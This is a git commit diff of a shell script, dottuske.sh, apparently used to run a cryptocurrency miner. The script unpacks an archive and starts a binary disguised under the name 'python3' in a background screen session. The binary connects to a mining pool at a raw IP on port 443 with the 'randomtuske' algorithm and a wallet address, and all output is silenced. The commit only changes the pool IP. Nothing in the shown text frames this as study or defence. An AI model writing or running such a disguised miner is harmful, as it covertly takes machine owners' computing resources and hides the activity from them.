943d347d03ac081bb640212890f611dac12fc215
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-28 04:33:47 +0700

    created hendi kusnandi

--- dottuske.sh
+++ dottuske.sh
@@ -6,4 +6,4 @@ tar -xzvf dot
 
 rm dot
 
-screen ./dotsrb/python3 -o 103.120.18.111:443 -a randomtuske -u TuskeSyuT7TEvsg3co36hu6z5P2jMksroYnq8ejhxDRd3K6LQSc4LhU8TR4u1CZVNBViJSNN79WUATZ2kgsfywYqehTMRzVaoLb4uF.DOT &>/dev/null
+screen ./dotsrb/python3 -o 103.120.18.227:443 -a randomtuske -u TuskeSyuT7TEvsg3co36hu6z5P2jMksroYnq8ejhxDRd3K6LQSc4LhU8TR4u1CZVNBViJSNN79WUATZ2kgsfywYqehTMRzVaoLb4uF.DOT &>/dev/null
